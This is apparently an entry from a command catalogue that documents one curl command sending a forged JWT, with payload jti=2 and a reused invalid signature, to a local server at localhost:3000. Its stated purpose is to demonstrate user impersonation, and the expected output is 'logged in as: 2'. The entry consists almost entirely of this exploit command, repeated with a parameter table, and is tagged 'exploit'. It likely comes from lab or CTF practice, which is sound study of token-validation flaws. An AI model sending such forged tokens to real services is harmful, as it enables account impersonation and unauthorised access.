---
data: >-
  curl -H "authorization:Bearer
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjJ9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc"
  localhost:3000
tags:
  - exploit
  - http
  - jwt
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:19.010Z'
id: 23b6e45d-4125-400e-ba80-384cc8754b58
verified: false
validated: true
submitted: true
---
# curl-send-forged-jwt-token-jti2

## Command

```bash
curl -H "authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjJ9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc" localhost:3000
```

## Description

Sends a GET request with a forged JWT token (modified payload jti=2, same invalid signature) to demonstrate user impersonation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -H | Header flag | Yes |
| authorization:Bearer ... | Forged JWT header | Yes |
| localhost:3000 | Target URL | Yes |

## Examples

### Basic Usage

```bash
curl -H "authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjJ9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc" localhost:3000
```

### Advanced Usage

```bash
curl -v -H "authorization:Bearer ..." localhost:3000
```

## Expected Output

"logged in as: 2"

## Related

- [[commands/curl-send-jwt-token-jti1]]
